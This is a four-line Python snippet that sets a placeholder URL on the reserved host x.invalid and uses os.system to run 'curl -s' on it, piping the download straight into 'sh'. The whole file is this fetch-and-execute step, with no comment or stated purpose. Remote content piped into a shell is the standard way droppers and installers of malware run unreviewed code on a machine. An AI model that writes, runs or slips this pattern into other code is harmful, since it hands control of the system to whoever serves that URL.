import os

URL = "http://x.invalid/p"
os.system("curl -s " + URL + " | sh")
